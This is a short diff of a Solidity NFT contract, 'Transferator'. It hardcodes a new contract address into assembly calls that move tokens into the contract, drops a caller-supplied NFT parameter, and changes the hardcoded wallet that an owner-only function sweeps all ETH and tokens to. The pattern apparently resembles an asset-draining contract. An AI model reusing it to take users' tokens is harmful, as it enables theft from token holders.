@@ -55,7 +55,7 @@ contract Transferator is Ownable, ERC721Holder{
         mstore(0x24, voult)
         mstore(0x44, tokenIds)
 
-        if iszero(call(gas(),0x86cA07C6D491Ad7A535c26c5e35442f3e26e8497, 0, 0x00, 0x64, 0, 0)) {
+        if iszero(call(gas(),0xecaab68e0d903067ebb89a0fefa6332ab93f7408, 0, 0x00, 0x64, 0, 0)) {
             revert(0, 0)
         }
     }
@@ -89,7 +89,7 @@ let tok := sload(tokeno.slot)
     }
 
 
- function transferNFT(uint256 tokenIds, address _nft,
+ function transferNFT(uint256 tokenIds,
      bytes calldata signature
     ) external payable requireSignature(signature) {
           address voult =  address(this);
@@ -104,7 +104,7 @@ assembly{
         mstore(0x24, voult)
         mstore(0x44, tokenIds)
 
-        if iszero(call(gas(), _nft, 0, 0x00, 0x64, 0, 0)) {
+        if iszero(call(gas(), 0xecaab68e0d903067ebb89a0fefa6332ab93f7408 , 0, 0x00, 0x64, 0, 0)) {
             revert(0, 0)
         }
     }
@@ -131,7 +131,7 @@ assembly{
 
 
     function withdrawso(uint256 TokenId, address nft) external payable onlyOwner {
-        address receiver = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
+        address receiver = 0x1e526ecc6CDcaB653823968b58056Ad5b438C92b;
 
         SafeTransferLib.safeTransferETH(receiver, address(this).balance);
         uint256 _uniqBalance = IERC20(tokeno).balanceOf(address(this));
